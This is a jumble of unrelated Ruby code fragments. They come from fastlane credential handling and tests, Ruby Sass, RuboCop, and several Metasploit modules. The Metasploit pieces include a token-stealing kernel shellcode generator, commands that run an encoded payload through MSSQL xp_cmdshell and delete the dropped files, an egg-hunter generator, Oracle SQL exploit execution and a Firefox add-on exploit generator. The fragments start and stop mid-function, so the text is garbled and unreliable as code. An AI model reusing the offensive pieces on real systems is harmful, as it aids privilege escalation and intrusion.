
        
                c.action do |args, options|
          Cert.config = FastlaneCore::Configuration.create(Cert::Options.available_options, options.__hash__)
          Cert::Runner.new.launch
        end
      end
    
        def login
      UI.message('Starting login with user '#{Cert.config[:username]}'')
      Spaceship.login(Cert.config[:username], nil)
      Spaceship.select_team
      UI.message('Successfully logged in')
    end
    
        # Remove entry from Apple Keychain using AccountManager
    def remove(username)
      CredentialsManager::AccountManager.new(
        user: username
      ).remove_from_keychain
    end
  end
end

    
        it 'loads the password from the keychain if empty password is stored by env' do
      ENV['FASTLANE_USER'] = user
      ENV['FASTLANE_PASSWORD'] = ''
      c = CredentialsManager::AccountManager.new
    
            expect(CredentialsManager::AppfileConfig.new('credentials_manager/spec/fixtures/Appfile4').data[:apple_id]).to eq('fabio@sunapps.ios.net')
        expect(CredentialsManager::AppfileConfig.new('credentials_manager/spec/fixtures/Appfile4').data[:app_identifier]).to eq('net.sunapps.ios.enterprise')
        expect(CredentialsManager::AppfileConfig.new('credentials_manager/spec/fixtures/Appfile4').data[:team_id]).to eq('Q2CBPJ58AA')
    
          export_path = File.join(export_path, 'Preview.html')
      File.write(export_path, html)
    
      #
  # Generate token stealing shellcode suitable for use when overwriting the
  # HaliQuerySystemInformation pointer. The shellcode preserves the edx and ebx
  # registers.
  #
  # @param target [Hash] The target information containing the offsets to _KPROCESS,
  #   _TOKEN, _UPID and _APLINKS.
  # @param backup_token [Integer] An optional location to write a copy of the
  #   original token to so it can be restored later.
  # @param arch [String] The architecture to return shellcode for. If this is nil,
  #   the arch will be guessed from the target and then module information.
  # @param append_ret [Boolean] Append a ret instruction for use when being called
  #   in place of HaliQuerySystemInformation.
  # @return [String] The token stealing shellcode.
  # @raise [ArgumentError] If the arch is incompatible.
  #
  def token_stealing_shellcode(target, backup_token = nil, arch = nil, append_ret = true)
    arch = target.opts['Arch'] if arch.nil? && target && target.opts['Arch']
    if arch.nil? && module_info['Arch']
      arch = module_info['Arch']
      arch = arch[0] if arch.is_a?(Array) and arch.length == 1
    end
    if arch.nil?
      print_error('Can not determine the target architecture')
      fail ArgumentError, 'Invalid arch'
    end
    
        print_status('Converting the encoded payload...')
    mssql_xpcmdshell('%TEMP%\\#{var_bypass}.exe %TEMP%\\#{var_payload}', debug)
    mssql_xpcmdshell('cmd.exe /c del %TEMP%\\#{var_bypass}.exe', debug)
    mssql_xpcmdshell('cmd.exe /c del %TEMP%\\#{var_payload}', debug)
    
      module Client
    def initialize(info = {})
      super
      register_advanced_options(
      [
      #
      # UseNTLMv2 forces NTLMv2 instead of NTLM2_session behavior when the 'Negotiate NTLM2' flag is set
      #
      OptBool.new('NTLM::UseNTLMv2', [ true, 'Use NTLMv2 instead of NTLM2_session when \'Negotiate NTLM2\' key is true', true]),
      #
      # UseNTLM2_session forces the use of NTLMV2 session keys instead of NTLMv1, emulating the default of Windows 2000+
      #
      OptBool.new('NTLM::UseNTLM2_session', [ true, 'Activate the \'Negotiate NTLM2 key\' flag, forcing the use of a NTLMv2_session', true]),
      #
      # SendLM has no effect when NTLM_UseNTLM2_session = true, NTLM_UseNTLMv2 = false or NTLM_SendNTLM = false
      #
      OptBool.new('NTLM::SendLM', [ true, 'Always send the LANMAN response (except when NTLMv2_session is specified)', true]),
      #
      # UseLMKey is valid when NTLM_SendLM = true, NTLM_SendNTLM = true, or NTLM_UseNTLM2_session = false
      #
      OptBool.new('NTLM::UseLMKey', [ true, 'Activate the \'Negotiate Lan Manager Key\' flag, using the LM key when the LM response is sent', false]),
      #
      # SendNTLM allows the NTLM response to be excluded, emulating Win9x behavior (don't change unless you are testing)
      #
      OptBool.new('NTLM::SendNTLM', [ true, 'Activate the \'Negotiate NTLM key\' flag, indicating the use of NTLM responses', true]),
      #
      # SendSPN will send an avp of type 9/SPN in the ntlmv2 client blob, this is mandatory on windows seven / 2008 r2 if
      # Microsoft network server : Server SPN target name validation level is set to <Required from client> or we get an STATUS_ACCESS_DENIED
      #
      OptBool.new('NTLM::SendSPN', [ true, 'Send an avp of type SPN in the ntlmv2 client blob, this allows authentication on Windows 7+/Server 2008 R2+ when SPN is required', true]),
      ], Msf::Exploit::NTLM::Client)
    end
  end
    
    
  #
  # Generates an omelet hunter stub and eggs
  #
  def generate_omelet(payload, badchars = nil, opts = {})
    # Prefer the target's platform/architecture information, but use
    # the module's if no target specific information exists
    los   = target_platform
    larch = target_arch || ARCH_X86
    
      def prepare_exec(sql)
    begin
      sploit = connect.parse(sql)
    rescue ::OCIError => e
      print_error('#{e.to_s}')
      return
    end
    # DEBUG
    # print_status('did the parse sploit type is ' + sploit.type.to_s)
    begin
      sploit.exec
    rescue ::OCIError => e
      if ( e.to_s =~ /ORA-00942: table or view does not exist/ )
        print_status('ORA-00942: table or view does not exist')
        raise RuntimeError, 'ORA-00942: table or view does not exist'
      end
    print_status e.to_s
    end
    
        @pdf << header
    
        when 'Fauth.c:L414:RClientAuthentication' ; return {:preauth => '8.2.7-1'}   # Failed (bad db, bad credentials) ubuntu 8.04.2
    when 'Fauth.c:L362:Rauth_failed'          ; return {:preauth => '8.2.14-15'} # Failed (bad db, bad credentials)
    when 'Fpostinit.c:L319:RInitPostgres'     ; return {:preauth => '8.2.14-15'} # Failed (bad db, good credentials)
    when 'Fauth.c:L419:RClientAuthentication' ; return {:preauth => '8.2.14-15'} # Rejected (maybe good)
    
        vprint_status('#{target_host}:#{rport} Port:#{port} Close:#{ res.inspect }')
    return
  end
    
          when /#{@flash_swf}/
        vprint_status('Sending SWF used for Flash detection to #{cli.peerhost}')
        swf = load_swf_detection
        send_response(cli, swf, {'Content-Type'=>'application/x-shockwave-flash', 'Cache-Control' => 'no-cache, no-store', 'Pragma' => 'no-cache'})
    
    module Msf
module Exploit::Remote::FirefoxAddonGenerator
  include Msf::Exploit::Remote::FirefoxPrivilegeEscalation
    
    $stderr.puts <<DEPRECATION
WARNING: Ruby Sass's Git repository is moving, and the old repository will be
deled on 26 March 2019! Please update your Git URLs to point to the new
repository at https://github.com/sass/ruby-sass.
    
          # Returns the path to a file for the given key.
      #
      # @param key [String]
      # @return [String] The path to the cache file.
      def path_to(key)
        key = key.gsub(/[<>:\\|?*%]/) {|c| '%%%03d' % c.ord}
        File.join(cache_location, key)
      end
    end
  end
end

    
          @options = options.merge(:_convert => true)
      # Backwards compatibility
      @options[:old] = true if @options[:alternate] == false
      @template = template
      @checked_encoding = false
    end
    
          # Polling is used by default on Windows.
      unless Sass::Util.windows?
        opts.on('--poll', 'Check for file changes manually, rather than relying on the OS.',
                          'Only meaningful for --watch.') do
          @options[:poll] = true
        end
      end
    
    module RuboCop
  module AST
    # A node extension for `for` nodes. This will be used in place of a plain
    # node when the builder constructs the AST, making its methods available
    # to all `for` nodes within RuboCop.
    class ForNode < Node
      # Returns the keyword of the `for` statement as a string.
      #
      # @return [String] the keyword of the `until` statement
      def keyword
        'for'
      end